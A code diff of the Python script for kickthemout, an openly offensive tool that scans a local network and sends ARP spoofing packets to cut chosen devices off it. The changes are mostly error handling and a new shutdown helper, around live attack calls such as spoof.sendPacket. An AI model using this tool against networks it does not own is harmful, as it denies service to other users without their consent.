@@ -25,10 +25,17 @@ except:
 if notRoot:
     raise SystemExit
 
+def shutdown():
+    print('\n\n{0}Thanks for dropping by.'
+          '\nCatch ya later!{1}').format(GREEN, END)
+    raise SystemExit
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
 try:
     from scapy.all import *
     import scan, spoof
+except KeyboardInterrupt:
+    shutdown()
 except:
     print("\n{0}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.").format(RED)
     print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(RED, BLUE, END)
@@ -146,8 +153,7 @@ def scanNetwork():
         # call scanning function from scan.py
         hostsList = scan.scanNetwork(getDefaultInterface(True))
     except KeyboardInterrupt:
-        print('\n\n{0}Thanks for dropping by.\nCatch ya later!{1}').format(GREEN, END)
-        raise SystemExit
+        shutdown()
     except:
         print("\n{0}ERROR: Network scanning failed. Please check your requirements configuration.{1}\n").format(RED, END)
         raise SystemExit
@@ -158,18 +164,17 @@ def scanNetwork():
 # TODO: Add this to scan.py
 # retrieve host MAC address
 def retrieveMACAddress(hosts):
+    try:
+        import nmap
 
-    import nmap
+        nm = nmap.PortScanner()
+        a = nm.scan(hosts=hosts, arguments='-sP -n')
 
-    nm = nmap.PortScanner()
-    a = nm.scan(hosts=hosts, arguments='-sP -n')
-    
-    for k, v in a['scan'].iteritems():
-        if str(v['status']['state']) == 'up':
-            try:
-                return str(v['addresses']['mac'])
-            except:
-                pass
+        for k, v in a['scan'].iteritems():
+            if str(v['status']['state']) == 'up':
+                    return str(v['addresses']['mac'])
+    except:
+        return False
 
 
 
@@ -198,18 +203,11 @@ def nonInteractiveAttack():
                 # broadcast malicious ARP packets (10p/s)
                 for i in target:
                     ip_address = i
-                    try:
-                        mac_address = retrieveMACAddress(ip_address)
-                    except:
+                    mac_address = retrieveMACAddress(ip_address)
+                    if mac_address == False:
                         print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
                         raise SystemExit
-    
-                    try:
-                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ip_address, mac_address)
-                    except KeyboardInterrupt:
-                        pass
-                    except:
-                        runDebug()
+                    spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ip_address, mac_address)
                 time.sleep(10)
         except KeyboardInterrupt:
             # re-arp targets on KeyboardInterrupt exception
@@ -249,7 +247,7 @@ def kickoneoff():
     sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
     sys.stdout.flush()
     scanNetwork()
-    
+
     print("Online IPs: ")
     for i in range(len(onlineIPs)):
         mac = ""
@@ -258,7 +256,7 @@ def kickoneoff():
                 mac = host[1]
         vendor = resolveMac(mac)
         print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t"+ vendor + "{4}").format(YELLOW, WHITE, RED, GREEN, END)
-    
+
     canBreak = False
     while not canBreak:
         try:
@@ -266,7 +264,7 @@ def kickoneoff():
             one_target_ip = onlineIPs[choice]
             canBreak = True
         except KeyboardInterrupt:
-            return
+            shutdown()
         except:
             print("\n{0}ERROR: Please enter a number from the list!{1}").format(RED, END)
 
@@ -339,14 +337,14 @@ def kicksomeoff():
             else:
                 print("\n{0}ERROR: Please select more than 1 devices from the list.{1}\n").format(RED, END)
         except KeyboardInterrupt:
-            return
+            shutdown()
 
     some_ipList = ""
     for i in some_targets:
         try:
             some_ipList += GREEN + "'" + RED + onlineIPs[int(i)] + GREEN + "', "
         except KeyboardInterrupt:
-            return
+            shutdown()
         except:
             print("\n{0}ERROR: '{1}" + i + "{2}' is not in the list.{3}\n").format(RED, GREEN, RED, END)
             return
@@ -522,6 +520,8 @@ def resolveMac(mac):
         vendor = vendor.decode("utf-8")
         vendor = vendor[:25]
         return vendor
+    except KeyboardInterrupt:
+        shutdown()
     except:
         return "N/A"
 
@@ -556,22 +556,22 @@ def main():
 
     else:
 
-        print("\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}" + 
+        print("\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}" +
             defaultGatewayIP + "{6}' --> Target(s): '{7}" + ", ".join(options.targets) + "{8}'.{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)
 
     if options.targets is None:
 
         try:
-    
+
             while True:
-    
+
                 optionBanner()
-    
+
                 header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
                 choice = raw_input(header)
 
                 global attackVector
-    
+
                 if choice.upper() == 'E' or choice.upper() == 'EXIT':
                     print('\n{0}Thanks for dropping by.'
                           '\nCatch ya later!{1}').format(GREEN, END)
@@ -673,8 +673,7 @@ def main():
                     print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)
 
         except KeyboardInterrupt:
-            print('\n\n{0}Thanks for dropping by.'
-                  '\nCatch ya later!{1}').format(GREEN, END)
+            shutdown()
 
     else:
 
@@ -711,11 +710,14 @@ if __name__ == '__main__':
     (options, argv) = parser.parse_args()
 
     # configure appropriate network info
-    defaultInterface = getDefaultInterface()
-    defaultGatewayIP = getGatewayIP()
-    defaultInterfaceMac = getDefaultInterfaceMAC()
-    global defaultGatewayMacSet
-    defaultGatewayMacSet = False
+    try:
+        defaultInterface = getDefaultInterface()
+        defaultGatewayIP = getGatewayIP()
+        defaultInterfaceMac = getDefaultInterfaceMAC()
+        global defaultGatewayMacSet
+        defaultGatewayMacSet = False
+    except KeyboardInterrupt:
+        shutdown()
 
     if options.attack is None and options.targets is None:
 
@@ -723,7 +725,7 @@ if __name__ == '__main__':
         interactive = True
         sys.stdout.write("{0}Scanning your network, hang on...{1}\r".format(GREEN, END))
         sys.stdout.flush()
-        
+
         # commence scanning process
         scanNetwork()
 
@@ -733,7 +735,7 @@ if __name__ == '__main__':
         interactive = True
         sys.stdout.write("{0}Scanning your network, hang on...{1}\r".format(GREEN, END))
         sys.stdout.flush()
-        
+
         # commence scanning process
         scanNetwork()
 
